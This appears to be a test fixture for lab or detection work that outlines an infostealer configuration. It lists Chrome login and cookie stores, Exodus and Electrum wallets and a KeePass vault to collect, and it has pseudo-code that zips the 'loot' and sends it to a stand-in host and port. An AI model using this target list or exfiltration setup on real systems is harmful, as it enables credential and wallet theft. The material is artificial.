; lab stealer fixture (atoms only, never executed)
[collect]
Software\Google\Chrome\User Data\Default\Login Data
Software\Google\Chrome\User Data\Default\Cookies
%APPDATA%\Exodus\exodus.wallet
%APPDATA%\Electrum\wallets
C:\lab\vault.kdbx
keyMaterial = takeMasterSecret()
archive = ZipFile("loot.zip")
browserRunning = processList contains chrome.exe
ScanningArgs = new StealerConfig(new HostPort("198.51.100.23", 9001), new ClientInfo(42), new BuildInfo("lab"))
